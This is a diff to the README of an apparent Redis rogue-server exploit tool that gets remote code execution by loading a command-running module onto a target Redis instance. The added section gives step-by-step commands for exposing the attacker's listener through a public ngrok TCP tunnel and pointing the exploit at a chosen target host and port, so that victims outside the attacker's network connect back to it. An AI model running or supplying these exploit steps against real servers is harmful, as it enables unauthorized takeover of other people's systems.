@@ -9,6 +9,23 @@ Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.
 
 Copy the .so file to same folder with `redis-rogue-server.py`.
 
+run with ngork
+```
+# Terminal 1 - Start ngrok on local port 21000
+ngrok tcp 21000
+
+# Output shows: tcp://0.tcp.ap.ngrok.io:12973 -> localhost:21000
+
+# Terminal 2 - Run exploit
+python3 redis-rogue-server.py \
+  --rhost <target address> \
+  --rport <target port> \
+  --lhost <ngrok address> \
+  --lport <ngrok port> \
+  --lport-local <local port> \
+  --lbind <local address>
+```
+
 Run the rogue server:
 
 ```
